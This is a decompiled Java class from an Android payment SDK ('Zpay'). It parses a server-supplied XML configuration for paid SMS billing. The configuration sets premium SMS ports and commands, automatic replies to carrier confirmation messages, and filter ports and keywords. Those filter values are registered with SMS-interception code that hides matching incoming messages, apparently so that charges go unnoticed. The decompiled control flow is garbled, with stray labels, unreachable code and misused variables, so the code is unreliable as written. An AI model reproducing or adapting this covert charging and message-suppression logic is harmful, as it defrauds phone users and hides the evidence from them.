package com.zhangzhifu.sdk.d;

import android.content.Context;
import android.util.Xml;
import com.zhangzhifu.sdk.b.c;
import com.zhangzhifu.sdk.b.d;
import com.zhangzhifu.sdk.b.f;
import com.zhangzhifu.sdk.b.g;
import com.zhangzhifu.sdk.b.h;
import com.zhangzhifu.sdk.b.i;
import com.zhangzhifu.sdk.b.j;
import com.zhangzhifu.sdk.b.k;
import com.zhangzhifu.sdk.b.l;
import com.zhangzhifu.sdk.util.n;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;

public class a
{
  private static String h;
  private static String i;
  private List a;
  private com.zhangzhifu.sdk.b.a b;
  private g c;
  private j d;
  private d e;
  private Context f;
  private String g;
  private com.zhangzhifu.sdk.util.sms.a.a j;
  
  public a() {}
  
  public List a(StringReader paramStringReader, Context paramContext)
  {
    this.f = paramContext;
    localXmlPullParser = Xml.newPullParser();
    try
    {
      localXmlPullParser.setInput(paramStringReader);
      k = localXmlPullParser.getEventType();
      n.f("Zpay", "eventType类型" + k);
      if (k != 1) {
        break label272;
      }
      paramStringReader.close();
    }
    catch (XmlPullParserException paramStringReader)
    {
      for (;;)
      {
        int k;
        paramStringReader.printStackTrace();
        n.f("Zpay", "解析文档失败　XmlPullParserException　" + paramStringReader.getMessage());
        continue;
        n.a("zhangPay_log", "解析startTag");
        localObject = localXmlPullParser.getName();
        n.a("zhangPay_log", "start_tag " + (String)localObject);
        if ((((String)localObject).equals("root")) || (((String)localObject).equals("procedure_1")) || (((String)localObject).equals("mutual")) || (((String)localObject).equals("procedure_pc1")) || (((String)localObject).equals("mutual_pc")) || (((String)localObject).equals("procedure_mm1")) || (((String)localObject).equals("mutual_mm")) || (((String)localObject).equals("procedure_mmq")) || (((String)localObject).equals("mutual_mmq")) || (((String)localObject).equals("procedure_wo1")) || (((String)localObject).equals("mutual_wo")) || (((String)localObject).equals("mutual_mux")) || (((String)localObject).equals("procedure_mux")) || (((String)localObject).equals("gateway"))) {
          break label2663;
        }
        String str1 = localXmlPullParser.nextText();
        try
        {
          if (!((String)localObject).equalsIgnoreCase("order_id")) {
            break;
          }
          com.zhangzhifu.sdk.a.e.g(this.f, str1);
          n.a("zhangPay_log", "OrderId " + com.zhangzhifu.sdk.a.e.i(this.f));
        }
        catch (Exception localException1)
        {
          n.f("zhangPay_log", "协议解析属性错误" + localException1.getMessage());
        }
      }
    }
    catch (IOException paramStringReader)
    {
      for (;;)
      {
        label272:
        Object localObject;
        paramStringReader.printStackTrace();
        n.f("Zpay", "解析文档失败　IOException" + paramStringReader.getMessage());
        continue;
        if (!((String)localObject).equalsIgnoreCase("version")) {
          if (((String)localObject).equalsIgnoreCase("fee_type")) {
            com.zhangzhifu.sdk.a.e.c(this.f, Integer.parseInt(localException1));
          } else if (((String)localObject).equalsIgnoreCase("call_interval")) {
            com.zhangzhifu.sdk.a.e.a(this.f, Integer.parseInt(localException1));
          } else if (((String)localObject).equalsIgnoreCase("call_max")) {
            com.zhangzhifu.sdk.a.e.b(this.f, Integer.parseInt(localException1));
          } else if (((String)localObject).equalsIgnoreCase("fee")) {
            com.zhangzhifu.sdk.a.e.a(this.f, localException1);
          } else if (((String)localObject).equalsIgnoreCase("prod_name")) {
            com.zhangzhifu.sdk.a.e.b(this.f, localException1);
          } else if (((String)localObject).equalsIgnoreCase("supp_name")) {
            com.zhangzhifu.sdk.a.e.c(this.f, localException1);
          } else if (((String)localObject).equalsIgnoreCase("view_url")) {
            com.zhangzhifu.sdk.e.a.e = localException1;
          } else if (!((String)localObject).equalsIgnoreCase("gateway")) {
            if (((String)localObject).equalsIgnoreCase("op"))
            {
              this.g = localException1;
            }
            else if (((String)localObject).equalsIgnoreCase("fee_mode"))
            {
              localObject = new com.zhangzhifu.sdk.b.b();
              if (localException1.equalsIgnoreCase("0"))
              {
                com.zhangzhifu.sdk.a.e.a().w(this.f, "0");
                ((com.zhangzhifu.sdk.b.b)localObject).a("0");
                this.b = new l();
                ((l)this.b).a(true);
              }
              else if (localException1.equalsIgnoreCase("7"))
              {
                com.zhangzhifu.sdk.a.e.a().w(this.f, "7");
                ((com.zhangzhifu.sdk.b.b)localObject).a("7");
                this.b = new l();
                ((l)this.b).a(false);
              }
              else if ((localException1.equalsIgnoreCase("13")) || (localException1.equalsIgnoreCase("14")))
              {
                ((com.zhangzhifu.sdk.b.b)localObject).a("13");
                com.zhangzhifu.sdk.a.e.a().w(this.f, "13");
                this.b = new f();
              }
              else if (localException1.equalsIgnoreCase("15"))
              {
                ((com.zhangzhifu.sdk.b.b)localObject).a("15");
                com.zhangzhifu.sdk.a.e.a().w(this.f, "15");
                this.b = new i();
              }
              else if (localException1.equalsIgnoreCase("19"))
              {
                ((com.zhangzhifu.sdk.b.b)localObject).a("19");
                com.zhangzhifu.sdk.a.e.a().w(this.f, "19");
                this.b = new c();
              }
              else
              {
                this.b = new h();
              }
            }
            else if (((String)localObject).equalsIgnoreCase("is_pop"))
            {
              com.zhangzhifu.sdk.a.e.d(this.f, Integer.parseInt(localException1));
            }
            else if (((String)localObject).equalsIgnoreCase("cmd"))
            {
              if ((this.b instanceof l)) {
                ((l)this.b).d(localException1);
              }
            }
            else if (((String)localObject).equalsIgnoreCase("port"))
            {
              if ((this.b instanceof l)) {
                ((l)this.b).e(localException1);
              }
            }
            else if (((String)localObject).equalsIgnoreCase("is_filter"))
            {
              this.b.a(localException1);
            }
            else if (((String)localObject).equalsIgnoreCase("is_second"))
            {
              if ((this.b instanceof l)) {
                ((l)this.b).b(Integer.parseInt(localException1));
              }
            }
            else
            {
              if (((String)localObject).equalsIgnoreCase("filter_port"))
              {
                if ((com.zhangzhifu.sdk.a.e.a().w(this.f) == null) || (com.zhangzhifu.sdk.a.e.a().w(this.f).equals(""))) {
                  com.zhangzhifu.sdk.a.e.a().u(this.f, localException1);
                }
                for (;;)
                {
                  h = localException1;
                  this.b.b(localException1);
                  break;
                  com.zhangzhifu.sdk.a.e.a().u(this.f, localException1);
                }
              }
              if (((String)localObject).equalsIgnoreCase("filter_info"))
              {
                n.b("zhangPay_log", "需要过滤的信息为" + localException1);
                i = localException1;
                this.b.c(localException1);
              }
              else if (((String)localObject).equalsIgnoreCase("second_type"))
              {
                com.zhangzhifu.sdk.a.e.a().v(this.f, localException1);
                boolean bool = this.b instanceof l;
                if (bool) {
                  try
                  {
                    ((l)this.b).c(Integer.parseInt(localException1));
                  }
                  catch (Exception localException2) {}
                }
              }
              else if (((String)localObject).equalsIgnoreCase("second_port"))
              {
                if ((this.b instanceof l)) {
                  ((l)this.b).f(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("reply_start_str"))
              {
                com.zhangzhifu.sdk.a.e.a().s(this.f, localException2);
                if ((this.b instanceof l)) {
                  ((l)this.b).g(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("reply_end_str"))
              {
                com.zhangzhifu.sdk.a.e.a().t(this.f, localException2);
                if ((this.b instanceof l)) {
                  ((l)this.b).h(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("reply_content"))
              {
                if ((this.b instanceof l)) {
                  ((l)this.b).i(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("charge_count"))
              {
                if ((this.b instanceof l)) {
                  ((l)this.b).d(Integer.parseInt(localException2));
                }
              }
              else if (((String)localObject).equalsIgnoreCase("sms_delay_time"))
              {
                if (((this.b instanceof l)) && (!localException2.trim().equals(""))) {
                  ((l)this.b).e(Integer.parseInt(localException2));
                }
              }
              else if (!((String)localObject).equalsIgnoreCase("mutual_mux"))
              {
                if (((String)localObject).equalsIgnoreCase("procedure_mux")) {
                  this.e = new d();
                } else if (((String)localObject).equalsIgnoreCase("a_url_mux"))
                {
                  if (this.e != null) {
                    this.e.a(localException2);
                  }
                }
                else if (((String)localObject).equalsIgnoreCase("type_mux"))
                {
                  if (this.e != null) {
                    this.e.b(Integer.parseInt(localException2));
                  }
                }
                else if (((String)localObject).equalsIgnoreCase("sms_num_mux"))
                {
                  if (this.e != null) {
                    this.e.b(localException2);
                  }
                }
                else if (((String)localObject).equalsIgnoreCase("timer_mux"))
                {
                  if (this.e != null) {
                    this.e.a(Integer.parseInt(localException2));
                  }
                }
                else if (!((String)localObject).equalsIgnoreCase("mutual")) {
                  if (((String)localObject).equalsIgnoreCase("procedure_1")) {
                    this.c = new g();
                  } else if (((String)localObject).equalsIgnoreCase("a_url_1"))
                  {
                    if (this.c != null) {
                      this.c.a(localException2);
                    }
                  }
                  else if (((String)localObject).equalsIgnoreCase("timer_1"))
                  {
                    if (this.c != null) {
                      this.c.a(Integer.parseInt(localException2));
                    }
                  }
                  else if (((String)localObject).equalsIgnoreCase("type_1"))
                  {
                    if (this.c != null) {
                      this.c.b(Integer.parseInt(localException2));
                    }
                  }
                  else if (((String)localObject).equalsIgnoreCase("sms_num_1"))
                  {
                    if (this.c != null) {
                      this.c.b(localException2);
                    }
                  }
                  else if (!((String)localObject).equalsIgnoreCase("mutual_pc")) {
                    if (((String)localObject).equalsIgnoreCase("procedure_pc1"))
                    {
                      this.d = new j();
                    }
                    else if (((String)localObject).equalsIgnoreCase("a_url_pc1"))
                    {
                      if (this.d != null) {
                        this.d.a(localException2);
                      }
                    }
                    else if (((String)localObject).equalsIgnoreCase("timer_pc1"))
                    {
                      if (this.d != null) {
                        this.d.a(Integer.parseInt(localException2));
                      }
                    }
                    else if (((String)localObject).equalsIgnoreCase("type_pc1"))
                    {
                      if (this.d != null) {
                        this.d.b(Integer.parseInt(localException2));
                      }
                    }
                    else if ((((String)localObject).equalsIgnoreCase("sms_num_pc1")) && (this.d != null))
                    {
                      this.d.b(localException2);
                      continue;
                      n.a("zhangPay_log", "解析endTag");
                      String str2 = localXmlPullParser.getName();
                      n.a("zhangPay_log", "end_tag " + str2);
                      if (str2.equalsIgnoreCase("gateway"))
                      {
                        if ((this.a != null) && (this.b != null))
                        {
                          this.a.add(this.b);
                          n.a("zhangPay_log", "endTag+allFees" + this.a.size());
                        }
                      }
                      else if (str2.equalsIgnoreCase("procedure_1"))
                      {
                        if ((this.b instanceof h))
                        {
                          n.a("zhangPay_log", "currentProed is " + this.c);
                          ((h)this.b).d().add(this.c);
                        }
                      }
                      else if (str2.equalsIgnoreCase("procedure_pc1"))
                      {
                        if ((this.b instanceof k))
                        {
                          n.a("zhangPay_log", "currentProed is " + this.d);
                          ((k)this.b).d().add(this.d);
                        }
                      }
                      else if (str2.equalsIgnoreCase("procedure_mux"))
                      {
                        if ((this.b instanceof com.zhangzhifu.sdk.b.e))
                        {
                          n.a("zhangPay_log", "currentProed is " + this.e);
                          ((com.zhangzhifu.sdk.b.e)this.b).d().add(this.e);
                        }
                      }
                      else if (str2.equalsIgnoreCase("root"))
                      {
                        n.a("zhangPay_log", "已经完成");
                        continue;
                        this.j.a(h.toLowerCase(), 0);
                        continue;
                        paramStringReader = h.concat("*");
                        com.zhangzhifu.sdk.util.sms.c.b.a().a(paramContext, 0, 0, paramStringReader);
                        continue;
                        com.zhangzhifu.sdk.util.sms.c.b.a().a(paramContext, 8, 0, i);
                        continue;
                        str2 = null;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    this.j = new com.zhangzhifu.sdk.util.sms.a.a(paramContext);
    if ((h != null) && (h.length() > 0))
    {
      if (h.contains("#"))
      {
        paramStringReader = h.substring(0, h.lastIndexOf("#"));
        this.j.a(paramStringReader.toLowerCase(), 0);
      }
    }
    else
    {
      if ((h != null) && (h.length() > 0))
      {
        if (!h.contains("#")) {
          break label2625;
        }
        paramStringReader = h.substring(0, h.lastIndexOf("#")).concat("*");
        com.zhangzhifu.sdk.util.sms.c.b.a().a(paramContext, 0, 0, paramStringReader);
      }
      if ((i != null) && (i.length() > 0))
      {
        if (!i.contains("#")) {
          break label2647;
        }
        paramStringReader = i.substring(0, i.lastIndexOf("#"));
        com.zhangzhifu.sdk.util.sms.c.b.a().a(paramContext, 8, 0, paramStringReader);
        paramStringReader = i.substring(i.lastIndexOf("#") + 1, i.length());
        com.zhangzhifu.sdk.util.sms.c.b.a().a(paramContext, 8, 0, paramStringReader);
      }
      return this.a;
      switch (k)
      {
      case 1: 
      default: 
      case 0: 
        for (;;)
        {
          k = localXmlPullParser.next();
          break;
          n.f("Zpay", "START_DOCUMENT");
          this.a = new ArrayList();
        }
      }
    }
  }
}
